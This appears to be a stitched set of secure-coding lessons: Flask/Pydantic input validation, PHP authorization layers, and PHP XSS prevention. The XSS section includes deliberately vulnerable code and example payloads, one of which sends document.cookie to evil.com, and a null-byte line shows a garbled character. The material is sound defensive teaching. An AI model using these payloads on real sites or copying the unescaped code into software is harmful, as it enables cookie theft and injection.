**Defense in Depth Layers**:

1. **Authentication Layer**: Multiple auth methods (JWT, API key, session) all verified server-side
```php
// Never trust tokens alone - always verify against database
$userRole = $this->getVerifiedRole($userId); // From DB, not token
```

2. **Authorization Layer**: Centralized permission checking before any business logic
```php
// Permission defined once, enforced everywhere
'users.update_role' => ['admin'],  // Only admins can change roles
```

3. **Business Logic Layer**: Additional constraints even after authorization passes
```php
// Can't assign roles at or above your own level
if ($roleHierarchy[$newRole] >= $roleHierarchy[$currentRole]) {
    return ['error' => 'Cannot assign this role level'];
}
```

**Additional Protections**:
- **Session fingerprinting**: Prevents session hijacking by binding sessions to client characteristics
- **Rate limiting**: Add rate limits on sensitive endpoints to slow brute force attempts
- **Real-time alerting**: Immediate notification on privilege escalation attempts
- **Audit trail**: Complete log of all authorization decisions for forensics
- **Principle of least privilege**: Roles can only grant permissions below their own level
- **Fail-secure defaults**: Unknown permissions or roles result in denial
- **Input validation at every layer**: Don't trust any input, even from authenticated users

For production applications with complex validation needs, you should use a schema-based validation library like Pydantic or Marshmallow. These provide declarative validation, automatic type coercion, nested object support, and better error messages.

**PRODUCTION PATTERN**:

```python
from flask import Flask, request, jsonify
from pydantic import BaseModel, Field, EmailStr, validator, root_validator
from pydantic import ValidationError as PydanticValidationError
from typing import Optional, List
from enum import Enum
from functools import wraps
import logging
import hashlib
import time
from datetime import datetime

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Rate limiting storage (use Redis in production)
request_counts = {}

class UserRole(str, Enum):
    USER = "user"
    GUEST = "guest"
    # ADMIN role never exposed to client input

class AddressSchema(BaseModel):
    """Nested object validation for address."""
    street: str = Field(..., min_length=5, max_length=200)
    city: str = Field(..., min_length=2, max_length=100)
    postal_code: str = Field(..., regex=r'^[A-Z0-9]{3,10}$')
    country: str = Field(..., min_length=2, max_length=2)  # ISO country code

    @validator('street', 'city')
    def sanitize_text(cls, v):
        # Remove potential XSS/injection characters
        dangerous_chars = '<>"\'{};'
        return ''.join(c for c in v if c not in dangerous_chars).strip()

class ProductSchema(BaseModel):
    """Array item validation for order products."""
    product_id: str = Field(..., regex=r'^[A-Z0-9]{8,12}$')
    quantity: int = Field(..., ge=1, le=100)

    @validator('quantity')
    def validate_quantity(cls, v):
        if v <= 0:
            raise ValueError('Quantity must be positive')
        return v

class UserRegistrationSchema(BaseModel):
    """Complete user registration with nested validation."""
    username: str = Field(..., min_length=3, max_length=30, regex=r'^[a-zA-Z0-9_]+$')
    email: EmailStr
    password: str = Field(..., min_length=12, max_length=128)
    age: Optional[int] = Field(None, ge=13, le=120)
    addresses: Optional[List[AddressSchema]] = Field(default=[], max_items=5)
    preferences: Optional[dict] = Field(default={})

    @validator('password')
    def validate_password_strength(cls, v):
        if not any(c.isupper() for c in v):
            raise ValueError('Password must contain uppercase letter')
        if not any(c.islower() for c in v):
            raise ValueError('Password must contain lowercase letter')
        if not any(c.isdigit() for c in v):
            raise ValueError('Password must contain digit')
        if not any(c in '!@#$%^&*()_+-=' for c in v):
            raise ValueError('Password must contain special character')
        return v

    @validator('preferences')
    def validate_preferences(cls, v):
        # Limit preference keys and values
        allowed_keys = {'theme', 'language', 'notifications', 'timezone'}
        if not all(k in allowed_keys for k in v.keys()):
            raise ValueError(f'Preferences must only contain: {allowed_keys}')
        # Limit value sizes to prevent DoS
        for key, value in v.items():
            if isinstance(value, str) and len(value) > 50:
                raise ValueError(f'Preference value too long: {key}')
        return v

    class Config:
        # Reject extra fields not in schema
        extra = 'forbid'
        # Strip whitespace from strings
        anystr_strip_whitespace = True

class OrderSchema(BaseModel):
    """Order with array of products."""
    customer_id: str = Field(..., regex=r'^CUST[0-9]{10}$')
    products: List[ProductSchema] = Field(..., min_items=1, max_items=50)
    shipping_address: AddressSchema
    express_shipping: bool = False
    notes: Optional[str] = Field(None, max_length=500)

    @root_validator
    def validate_order_totals(cls, values):
        products = values.get('products', [])
        total_items = sum(p.quantity for p in products)
        if total_items > 200:
            raise ValueError('Order cannot exceed 200 total items')
        return values

def validate_schema(schema_class):
    """Decorator for automatic schema validation."""
    def decorator(f):
        @wraps(f)
        def wrapped(*args, **kwargs):
            try:
                data = request.get_json()
                if data is None:
                    return jsonify({"error": "Request body must be JSON"}), 400

                # Validate against schema
                validated = schema_class(**data)
                # Pass validated model to handler
                kwargs['validated_data'] = validated
                return f(*args, **kwargs)

            except PydanticValidationError as e:
                # Log validation failures for security monitoring
                logger.warning(
                    f"Validation failed from {request.remote_addr}: "
                    f"{e.error_count()} errors"
                )
                # Return structured errors (safe, no internal details)
                errors = [
                    {"field": '.'.join(str(x) for x in err['loc']), 
                     "message": err['msg']}
                    for err in e.errors()
                ]
                return jsonify({"errors": errors}), 400

        return wrapped
    return decorator

def rate_limit(max_requests=10, window_seconds=60):
    """Simple rate limiting decorator."""
    def decorator(f):
        @wraps(f)
        def wrapped(*args, **kwargs):
            client_ip = request.remote_addr
            current_time = time.time()

            # Clean old entries
            if client_ip in request_counts:
                request_counts[client_ip] = [
                    t for t in request_counts[client_ip]
                    if current_time - t < window_seconds
                ]
            else:
                request_counts[client_ip] = []

            if len(request_counts[client_ip]) >= max_requests:
                logger.warning(f"Rate limit exceeded: {client_ip}")
                return jsonify({"error": "Rate limit exceeded"}), 429

            request_counts[client_ip].append(current_time)
            return f(*args, **kwargs)
        return wrapped
    return decorator

@app.route('/api/register', methods=['POST'])
@rate_limit(max_requests=5, window_seconds=300)
@validate_schema(UserRegistrationSchema)
def register_user(validated_data: UserRegistrationSchema):
    """Register user with fully validated data."""
    # Data is already validated, typed, and sanitized
    logger.info(
        f"Registration: user={validated_data.username} "
        f"addresses={len(validated_data.addresses)} "
        f"ip={request.remote_addr}"
    )

    # Safe to use validated_data directly
    # Role is NEVER accepted from client - set server-side
    user_data = {
        "username": validated_data.username,
        "email": validated_data.email,
        "age": validated_data.age,
        "role": "user",  # Server-enforced
        "addresses": [addr.dict() for addr in validated_data.addresses],
        "created_at": datetime.utcnow().isoformat()
    }

    # Hash password before storage (never store plain text)
    # In production, use bcrypt or argon2

    return jsonify({"message": "User registered", "username": user_data["username"]}), 201

@app.route('/api/orders', methods=['POST'])
@rate_limit(max_requests=20, window_seconds=60)
@validate_schema(OrderSchema)
def create_order(validated_data: OrderSchema):
    """Create order with validated nested data."""
    total_products = len(validated_data.products)
    total_items = sum(p.quantity for p in validated_data.products)

    logger.info(
        f"Order created: customer={validated_data.customer_id} "
        f"products={total_products} items={total_items}"
    )

    return jsonify({
        "message": "Order created",
        "product_count": total_products,
        "item_count": total_items
    }), 201

# Security headers middleware
@app.after_request
def add_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Content-Security-Policy'] = "default-src 'self'"
    return response

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=5000)
```

**Defense in Depth Layers**:

1. **Schema Validation Layer**: Pydantic enforces types, ranges, patterns, and relationships
```python
username: str = Field(..., min_length=3, max_length=30, regex=r'^[a-zA-Z0-9_]+$')
```

2. **Rate Limiting Layer**: Prevents brute force and DoS attacks
```python
@rate_limit(max_requests=5, window_seconds=300)
```

3. **Business Logic Validation**: Custom validators for complex rules
```python
@root_validator
def validate_order_totals(cls, values):
    total_items = sum(p.quantity for p in values.get('products', []))
    if total_items > 200:
        raise ValueError('Order cannot exceed 200 total items')
```

**Additional Protections**:
- **Extra Fields Rejection**: `extra = 'forbid'` prevents mass assignment attacks
- **Audit Logging**: All validation failures logged with IP for threat detection
- **Security Headers**: CSP, X-Frame-Options protect against XSS and clickjacking
- **Structured Error Responses**: Detailed enough for debugging, safe for production
- **Nested Validation**: Arrays and objects validated recursively with limits
- **Enum Constraints**: Role values restricted to safe allowlist, admin never exposed

I'll show you both vulnerable and secure approaches to outputting user data in PHP.

**Vulnerable Code (XSS Risk):**
```php
<?php
// DANGEROUS: Direct output without escaping
function displayUserProfile($user) {
    echo "<div class='profile'>";
    echo "<h2>" . $user['name'] . "</h2>";
    echo "<p>Bio: " . $user['bio'] . "</p>";
    echo "<a href='" . $user['website'] . "'>Website</a>";
    echo "</div>";
}

// DANGEROUS: Using user input in HTML attributes
function displayComment($comment) {
    ?>
    <div class="comment" data-comment-id="<?= $comment['id'] ?>">
        <strong><?= $comment['username'] ?></strong>:
        <?= $comment['text'] ?>
    </div>
    <?php
}

// Usage
$userInput = $_GET['name'];
displayUserProfile(['name' => $userInput, 'bio' => $_GET['bio'], 'website' => $_GET['website']]);
?>
```

**Why This Is Dangerous:**
An attacker can inject malicious HTML/JavaScript:
```
name=<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
bio=<img src=x onerror="alert('XSS')">
website=javascript:alert(document.cookie)
```

**Real-World Impact:** In 2024, Magento (Adobe Commerce) had a stored XSS vulnerability (CVE-2024-20720) in the admin panel. Attackers injected JavaScript into product descriptions, which executed when admins viewed products, leading to session hijacking and full store compromise.

**Secure Implementation:**
```php
<?php
// SECURE: Proper output escaping
function displayUserProfileSafe($user) {
    // htmlspecialchars escapes HTML entities
    $safeName = htmlspecialchars($user['name'], ENT_QUOTES, 'UTF-8');
    $safeBio = htmlspecialchars($user['bio'], ENT_QUOTES, 'UTF-8');

    // Validate and sanitize URL
    $safeWebsite = sanitizeUrl($user['website']);

    echo "<div class='profile'>";
    echo "<h2>" . $safeName . "</h2>";
    echo "<p>Bio: " . $safeBio . "</p>";
    echo "<a href='" . $safeWebsite . "' target='_blank' rel='noopener noreferrer'>Website</a>";
    echo "</div>";
}

function sanitizeUrl($url) {
    // Parse URL and validate protocol
    $parsed = parse_url($url);

    if ($parsed === false) {
        return '#';  // Invalid URL
    }

    // Only allow http and https protocols
    $scheme = $parsed['scheme'] ?? '';
    if (!in_array($scheme, ['http', 'https'], true)) {
        return '#';
    }

    // Return escaped URL
    return htmlspecialchars($url, ENT_QUOTES, 'UTF-8');
}

// SECURE: Using modern templating with auto-escaping
function displayCommentSafe($comment) {
    // Escape all output by default
    $safeId = htmlspecialchars($comment['id'], ENT_QUOTES, 'UTF-8');
    $safeUsername = htmlspecialchars($comment['username'], ENT_QUOTES, 'UTF-8');
    $safeText = htmlspecialchars($comment['text'], ENT_QUOTES, 'UTF-8');
    ?>
    <div class="comment" data-comment-id="<?= $safeId ?>">
        <strong><?= $safeUsername ?></strong>:
        <?= $safeText ?>
    </div>
    <?php
}

// Helper function for safe output
function e($string) {
    return htmlspecialchars($string, ENT_QUOTES, 'UTF-8');
}

// Input validation and sanitization
function getCleanInput($key, $maxLength = 1000) {
    $value = $_GET[$key] ?? $_POST[$key] ?? '';

    // Length validation
    if (strlen($value) > $maxLength) {
        return '';
    }

    // Remove null bytes
    $value = str_replace("�", '', $value);

    return $value;
}

// Usage
$name = getCleanInput('name', 100);
$bio = getCleanInput('bio', 500);
$website = getCleanInput('website', 200);

displayUserProfileSafe(['name' => $name, 'bio' => $bio, 'website' => $website]);
?>
```

**Key Security Controls:**
1. **htmlspecialchars() with ENT_QUOTES** - Escapes HTML entities including quotes
2. **UTF-8 encoding** - Prevents encoding-based XSS attacks
3. **URL validation** - Only allow http(s) protocols
4. **Input length limits** - Prevent buffer overflow and DoS
5. **Null byte removal** - Prevent null byte injection
6. **Helper function e()** - Simplifies secure output in templates

For rich content, use HTML Purifier library with strict allowlists:

```php
<?php
// Install: composer require ezyang/htmlpurifier

require_once 'vendor/autoload.php';

class SecureHtmlRenderer {
    private $purifier;

    public function __construct() {
        $config = HTMLPurifier_Config::createDefault();

        // Strict configuration
        $config->set('HTML.Allowed', 'p,br,b,i,em,strong,a[href|title]');
        $config->set('HTML.AllowedSchemes', ['http' => true, 'https' => true]);
        $config->set('HTML.TargetBlank', true);  // Add target="_blank" to links
        $config->set('HTML.Nofollow', true);     // Add rel="nofollow"
        $config->set('AutoFormat.RemoveEmpty', true);
        $config->set('AutoFormat.Linkify', false);  // Don't auto-linkify
        $config->set('URI.DisableExternalResources', true);

        // Cache directory for performance
        $config->set('Cache.SerializerPath', '/tmp/htmlpurifier');

        $this->purifier = new HTMLPurifier($config);
    }

    public function sanitize($html) {
        return $this->purifier->purify($html);
    }

    public function renderComment($username, $comment) {
        // Username gets no HTML
        $safeUsername = htmlspecialchars($username, ENT_QUOTES, 'UTF-8');

        // Comment gets sanitized HTML
        $safeComment = $this->sanitize($comment);

        echo "<div class='comment'>";
        echo "<strong>" . $safeUsername . "</strong>: ";
        echo "<div class='comment-text'>" . $safeComment . "</div>";
        echo "</div>";
    }
}

// Alternative: Using Twig template engine with auto-escaping
class TwigSecureRenderer {
    private $twig;

    public function __construct() {
        $loader = new \Twig\Loader\FilesystemLoader(__DIR__ . '/templates');

        $this->twig = new \Twig\Environment($loader, [
            'autoescape' => 'html',  // Auto-escape by default
            'strict_variables' => true,
        ]);

        // Add custom filter for rich content
        $this->twig->addFilter(new \Twig\TwigFilter('sanitize_html', function ($html) {
            $purifier = new HTMLPurifier(HTMLPurifier_Config::createDefault());
            return $purifier->purify($html);
        }, ['is_safe' => ['html']]));
    }

    public function render($template, $data) {
        return $this->twig->render($template, $data);
    }
}

